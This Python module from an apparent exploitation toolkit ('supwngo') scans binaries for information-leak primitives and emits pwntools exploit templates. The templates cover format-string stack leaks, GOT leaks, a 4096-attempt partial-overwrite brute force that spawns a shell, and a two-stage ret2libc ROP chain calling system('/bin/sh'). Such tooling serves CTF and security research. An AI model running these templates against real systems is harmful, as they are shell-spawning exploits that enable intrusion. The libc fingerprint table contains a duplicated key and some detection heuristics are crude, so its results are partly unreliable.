"""
Enhanced leak detection module.

Provides automatic detection of information leak primitives including:
- Print/write with controllable addresses
- Format string leak chains
- Partial overwrite detection
- Libc fingerprinting from leaked addresses
- Stack address leak detection
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from enum import Enum, auto
import re
import struct

from supwngo.core.binary import Binary
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class LeakType(Enum):
    """Types of information leaks."""
    STACK_ADDRESS = auto()
    LIBC_ADDRESS = auto()
    PIE_ADDRESS = auto()
    HEAP_ADDRESS = auto()
    CANARY = auto()
    GOT_ENTRY = auto()
    RETURN_ADDRESS = auto()
    FORMAT_STRING = auto()
    UNINITIALIZED_MEMORY = auto()
    OOB_READ = auto()


class LeakPrimitive(Enum):
    """Primitives that can cause leaks."""
    PRINTF = auto()
    PUTS = auto()
    WRITE = auto()
    SEND = auto()
    FORMAT_STRING = auto()
    ARRAY_OOB = auto()
    UNINITIALIZED = auto()
    PARTIAL_OVERWRITE = auto()


@dataclass
class LeakOpportunity:
    """Represents a potential information leak."""
    leak_type: LeakType
    primitive: LeakPrimitive
    address: int  # Address where leak occurs
    function: str
    description: str
    controllable: bool = False  # Can we control what gets leaked?
    offset: Optional[int] = None  # Stack offset for format string
    confidence: float = 0.5
    exploit_template: str = ""
    prerequisites: List[str] = field(default_factory=list)


@dataclass
class LeakChain:
    """A chain of leaks to bypass multiple protections."""
    leaks: List[LeakOpportunity]
    bypasses: List[str]  # What this chain bypasses (ASLR, PIE, etc.)
    total_confidence: float = 0.0
    exploit_template: str = ""


# Common libc offsets for fingerprinting
LIBC_FINGERPRINTS = {
    # Last 3 nibbles of common functions
    "puts": {
        0x420: "Ubuntu GLIBC 2.27-3ubuntu1",
        0x9c0: "Ubuntu GLIBC 2.31-0ubuntu9",
        0x050: "Debian GLIBC 2.31-13",
        0x420: "CentOS GLIBC 2.17",
    },
    "printf": {
        0x670: "Ubuntu GLIBC 2.27-3ubuntu1",
        0xf00: "Ubuntu GLIBC 2.31-0ubuntu9",
    },
    "__libc_start_main": {
        0xab0: "Ubuntu GLIBC 2.27-3ubuntu1",
        0xfc0: "Ubuntu GLIBC 2.31-0ubuntu9",
    },
}


class LeakFinder:
    """
    Automatic information leak detection.

    Identifies opportunities to leak:
    - Stack addresses (for stack pivoting, ROP)
    - Libc addresses (for ret2libc, one_gadget)
    - PIE base (for bypassing PIE)
    - Heap addresses (for heap exploitation)
    - Canary values (for stack protection bypass)
    """

    def __init__(self, binary: Binary):
        """
        Initialize leak finder.

        Args:
            binary: Binary instance to analyze
        """
        self.binary = binary
        self.leaks: List[LeakOpportunity] = []
        self.chains: List[LeakChain] = []

    def find_all_leaks(self) -> List[LeakOpportunity]:
        """
        Find all potential information leaks.

        Returns:
            List of leak opportunities
        """
        logger.info("Searching for information leak opportunities...")

        self.leaks = []

        # Check for format string leaks
        self._find_format_string_leaks()

        # Check for print/puts with controllable data
        self._find_print_leaks()

        # Check for uninitialized memory leaks
        self._find_uninitialized_leaks()

        # Check for OOB read opportunities
        self._find_oob_read_leaks()

        # Check for partial overwrite opportunities
        self._find_partial_overwrite_leaks()

        # Build leak chains
        self._build_leak_chains()

        logger.info(f"Found {len(self.leaks)} leak opportunities")
        return self.leaks

    def _find_format_string_leaks(self) -> None:
        """Find format string based leaks."""
        # Check if printf family is imported
        printf_funcs = ['printf', 'fprintf', 'sprintf', 'snprintf', 'dprintf']
        has_printf = any(f in self.binary.plt for f in printf_funcs)

        if not has_printf:
            return

        # Analyze for format string vulnerabilities
        try:
            import capstone
            cs = capstone.Cs(capstone.CS_ARCH_X86,
                           capstone.CS_MODE_64 if self.binary.bits == 64 else capstone.CS_MODE_32)
            cs.detail = True

            # Look for printf calls with non-constant format
            for func_name, func_addr in self.binary.symbols.items():
                if not func_addr or isinstance(func_addr, int):
                    addr = func_addr if isinstance(func_addr, int) else 0
                else:
                    addr = func_addr.address

                if addr == 0:
                    continue

                try:
                    data = self.binary.read(addr, 0x200)
                    for insn in cs.disasm(data, addr):
                        if insn.mnemonic == 'call':
                            # Check if calling printf
                            for pf in printf_funcs:
                                if pf in self.binary.plt:
                                    plt_addr = self.binary.plt[pf]
                                    if insn.op_str == hex(plt_addr) or str(plt_addr) in insn.op_str:
                                        # Found printf call - check if format is controllable
                                        leak = LeakOpportunity(
                                            leak_type=LeakType.FORMAT_STRING,
                                            primitive=LeakPrimitive.FORMAT_STRING,
                                            address=insn.address,
                                            function=func_name,
                                            description=f"Format string leak via {pf}()",
                                            controllable=True,
                                            confidence=0.7,
                                            exploit_template=self._gen_fmtstr_leak_template(),
                                        )
                                        self.leaks.append(leak)
                                        break
                except Exception:
                    continue

        except Exception as e:
            logger.debug(f"Format string leak detection failed: {e}")

        # Add generic format string leak if printf exists
        if 'printf' in self.binary.plt and not self.leaks:
            self.leaks.append(LeakOpportunity(
                leak_type=LeakType.FORMAT_STRING,
                primitive=LeakPrimitive.FORMAT_STRING,
                address=self.binary.plt['printf'],
                function="printf@plt",
                description="Potential format string leak (printf in PLT)",
                controllable=True,
                confidence=0.5,
                exploit_template=self._gen_fmtstr_leak_template(),
            ))

    def _find_print_leaks(self) -> None:
        """Find print/puts based leaks."""
        print_funcs = {
            'puts': LeakPrimitive.PUTS,
            'fputs': LeakPrimitive.PUTS,
            'write': LeakPrimitive.WRITE,
            'send': LeakPrimitive.SEND,
            'fwrite': LeakPrimitive.WRITE,
        }

        for func, primitive in print_funcs.items():
            if func in self.binary.plt:
                # Check for GOT entries that could be leaked
                if func in self.binary.got:
                    got_addr = self.binary.got[func]
                    self.leaks.append(LeakOpportunity(
                        leak_type=LeakType.GOT_ENTRY,
                        primitive=primitive,
                        address=got_addr,
                        function=func,
                        description=f"GOT entry for {func} - can leak libc address after resolution",
                        controllable=False,
                        confidence=0.8,
                        exploit_template=self._gen_got_leak_template(func),
                    ))

    def _find_uninitialized_leaks(self) -> None:
        """Find uninitialized memory leaks."""
        # Check for functions that might use uninitialized buffers
        try:
            import capstone
            cs = capstone.Cs(capstone.CS_ARCH_X86,
                           capstone.CS_MODE_64 if self.binary.bits == 64 else capstone.CS_MODE_32)

            # Look for stack allocations without initialization followed by output
            for func_name, sym in self.binary.symbols.items():
                addr = sym.address if hasattr(sym, 'address') else sym
                if not addr:
                    continue

                try:
                    data = self.binary.read(addr, 0x200)
                    has_sub_rsp = False
                    has_output = False

                    for insn in cs.disasm(data, addr):
                        # Stack allocation
                        if insn.mnemonic == 'sub' and 'rsp' in insn.op_str:
                            has_sub_rsp = True
                        # Output without apparent initialization
                        if insn.mnemonic == 'call' and has_sub_rsp:
                            for out_func in ['puts', 'printf', 'write', 'send']:
                                if out_func in self.binary.plt:
                                    if str(self.binary.plt[out_func]) in insn.op_str:
                                        has_output = True

                    if has_sub_rsp and has_output:
                        self.leaks.append(LeakOpportunity(
                            leak_type=LeakType.UNINITIALIZED_MEMORY,
                            primitive=LeakPrimitive.UNINITIALIZED,
                            address=addr,
                            function=func_name,
                            description="Potential uninitialized stack buffer leak",
                            controllable=False,
                            confidence=0.3,
                        ))
                except Exception:
                    continue

        except Exception as e:
            logger.debug(f"Uninitialized leak detection failed: {e}")

    def _find_oob_read_leaks(self) -> None:
        """Find out-of-bounds read opportunities."""
        # Check for array access patterns without bounds checking
        try:
            import capstone
            cs = capstone.Cs(capstone.CS_ARCH_X86,
                           capstone.CS_MODE_64 if self.binary.bits == 64 else capstone.CS_MODE_32)

            # Look for indexed memory access patterns
            for func_name, sym in self.binary.symbols.items():
                addr = sym.address if hasattr(sym, 'address') else sym
                if not addr:
                    continue

                try:
                    data = self.binary.read(addr, 0x200)
                    for insn in cs.disasm(data, addr):
                        # Look for memory access with register index
                        if insn.mnemonic == 'mov' and '[' in insn.op_str and '*' in insn.op_str:
                            self.leaks.append(LeakOpportunity(
                                leak_type=LeakType.OOB_READ,
                                primitive=LeakPrimitive.ARRAY_OOB,
                                address=insn.address,
                                function=func_name,
                                description="Potential OOB read via indexed access",
                                controllable=True,
                                confidence=0.4,
                            ))
                            break
                except Exception:
                    continue

        except Exception as e:
            logger.debug(f"OOB read detection failed: {e}")

    def _find_partial_overwrite_leaks(self) -> None:
        """Find partial overwrite opportunities for PIE bypass."""
        if not self.binary.protections.pie:
            return  # No PIE means no need for partial overwrite

        # PIE binaries with partial RELRO can use GOT partial overwrite
        if self.binary.protections.relro != "Full":
            self.leaks.append(LeakOpportunity(
                leak_type=LeakType.PIE_ADDRESS,
                primitive=LeakPrimitive.PARTIAL_OVERWRITE,
                address=0,
                function="",
                description="PIE + Partial RELRO: Can partially overwrite GOT (12-bit brute force)",
                controllable=True,
                confidence=0.6,
                prerequisites=["Stack buffer overflow", "Format string write"],
                exploit_template=self._gen_partial_overwrite_template(),
            ))

    def _build_leak_chains(self) -> None:
        """Build chains of leaks to bypass multiple protections."""
        # Group leaks by what they can bypass
        stack_leaks = [l for l in self.leaks if l.leak_type == LeakType.STACK_ADDRESS]
        libc_leaks = [l for l in self.leaks if l.leak_type in
                     (LeakType.LIBC_ADDRESS, LeakType.GOT_ENTRY, LeakType.FORMAT_STRING)]
        pie_leaks = [l for l in self.leaks if l.leak_type == LeakType.PIE_ADDRESS]

        # Build chain for full ASLR bypass
        if libc_leaks and self.binary.protections.pie:
            if pie_leaks:
                chain = LeakChain(
                    leaks=[libc_leaks[0], pie_leaks[0]],
                    bypasses=["ASLR", "PIE"],
                    total_confidence=libc_leaks[0].confidence * pie_leaks[0].confidence,
                )
                self.chains.append(chain)

        # Build chain for ret2libc
        if libc_leaks:
            chain = LeakChain(
                leaks=[libc_leaks[0]],
                bypasses=["ASLR (libc)"],
                total_confidence=libc_leaks[0].confidence,
                exploit_template=self._gen_ret2libc_leak_template(),
            )
            self.chains.append(chain)

    def _gen_fmtstr_leak_template(self) -> str:
        """Generate format string leak template."""
        return '''
# Format string leak template
from pwn import *

def leak_stack(io, offset):
    """Leak stack value at offset."""
    io.sendline(f"%{offset}$p".encode())
    leak = io.recvline()
    return int(leak.strip(), 16)

def leak_libc(io, offset):
    """Leak libc address from stack."""
    # Common offsets: __libc_start_main return is often at offset 15-25
    addr = leak_stack(io, offset)
    return addr

# Find correct offset by leaking multiple values
for i in range(1, 30):
    try:
        val = leak_stack(io, i)
        print(f"Offset {i}: {hex(val)}")
    except:
        pass
'''

    def _gen_got_leak_template(self, func: str) -> str:
        """Generate GOT leak template."""
        return f'''
# GOT leak template for {func}
from pwn import *

elf = ELF("./binary")
libc = ELF("./libc.so.6")  # Adjust path

# Leak {func}@got
io.sendline(b"A" * offset + p64(elf.got['{func}']))
leaked = u64(io.recv(6).ljust(8, b'\\x00'))
print(f"Leaked {func}@got: {{hex(leaked)}}")

# Calculate libc base
libc.address = leaked - libc.sym['{func}']
print(f"Libc base: {{hex(libc.address)}}")
'''

    def _gen_partial_overwrite_template(self) -> str:
        """Generate partial overwrite template."""
        return '''
# Partial overwrite template (12-bit brute force)
from pwn import *

# Only overwrite lower 12 bits - 1/16 chance of success
# Target: overwrite GOT entry to point to win function or one_gadget

def try_exploit():
    io = process("./binary")

    # Partial overwrite - only send lower bytes
    target_offset = ...  # Calculate offset to GOT entry

    # Overwrite only lower 2 bytes (keep upper bytes from ASLR)
    payload = b"A" * offset
    payload += p16(0x1234)  # Lower 12 bits of target (4 bits known from page alignment)

    io.send(payload)
    try:
        io.sendline(b"id")
        if b"uid" in io.recv(timeout=1):
            io.interactive()
            return True
    except:
        pass
    io.close()
    return False

# Brute force
for i in range(4096):
    if try_exploit():
        break
    print(f"Attempt {i+1}/4096")
'''

    def _gen_ret2libc_leak_template(self) -> str:
        """Generate ret2libc leak template."""
        return '''
# ret2libc with leak template
from pwn import *

elf = ELF("./binary")
libc = ELF("./libc.so.6")

# Stage 1: Leak libc address
io = process("./binary")

# Use puts to leak GOT entry
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.sym['main'])  # Return to main for stage 2

payload = b"A" * offset + rop.chain()
io.sendline(payload)

leaked_puts = u64(io.recv(6).ljust(8, b'\\x00'))
libc.address = leaked_puts - libc.sym['puts']
log.success(f"Libc base: {hex(libc.address)}")

# Stage 2: ret2libc
rop2 = ROP(libc)
rop2.system(next(libc.search(b"/bin/sh")))

payload2 = b"A" * offset + rop2.chain()
io.sendline(payload2)
io.interactive()
'''

    def fingerprint_libc(self, leaked_addr: int, func_name: str) -> List[str]:
        """
        Fingerprint libc version from leaked address.

        Args:
            leaked_addr: Leaked address value
            func_name: Name of leaked function

        Returns:
            List of possible libc versions
        """
        matches = []
        last_nibbles = leaked_addr & 0xFFF

        if func_name in LIBC_FINGERPRINTS:
            for nibbles, version in LIBC_FINGERPRINTS[func_name].items():
                if nibbles == last_nibbles:
                    matches.append(version)

        return matches

    def get_best_leak_for(self, target: str) -> Optional[LeakOpportunity]:
        """
        Get the best leak opportunity for a specific target.

        Args:
            target: What to leak ("libc", "pie", "stack", "canary", "heap")

        Returns:
            Best leak opportunity or None
        """
        type_map = {
            "libc": [LeakType.LIBC_ADDRESS, LeakType.GOT_ENTRY, LeakType.FORMAT_STRING],
            "pie": [LeakType.PIE_ADDRESS],
            "stack": [LeakType.STACK_ADDRESS, LeakType.RETURN_ADDRESS],
            "canary": [LeakType.CANARY],
            "heap": [LeakType.HEAP_ADDRESS],
        }

        target_types = type_map.get(target, [])
        candidates = [l for l in self.leaks if l.leak_type in target_types]

        if not candidates:
            return None

        # Sort by confidence and controllability
        candidates.sort(key=lambda x: (x.controllable, x.confidence), reverse=True)
        return candidates[0]

    def summary(self) -> str:
        """Get leak finder summary."""
        lines = [
            "Leak Finder Summary",
            "=" * 40,
            f"Total Leaks Found: {len(self.leaks)}",
            f"Leak Chains: {len(self.chains)}",
            "",
        ]

        if self.leaks:
            lines.append("Leak Opportunities:")
            for leak in self.leaks[:10]:
                ctrl = "[CTRL]" if leak.controllable else ""
                lines.append(f"  [{leak.leak_type.name}] {leak.function} {ctrl}")
                lines.append(f"      {leak.description}")

        if self.chains:
            lines.append("")
            lines.append("Leak Chains:")
            for chain in self.chains:
                lines.append(f"  Bypasses: {', '.join(chain.bypasses)}")
                lines.append(f"  Confidence: {chain.total_confidence:.2f}")

        return "\n".join(lines)
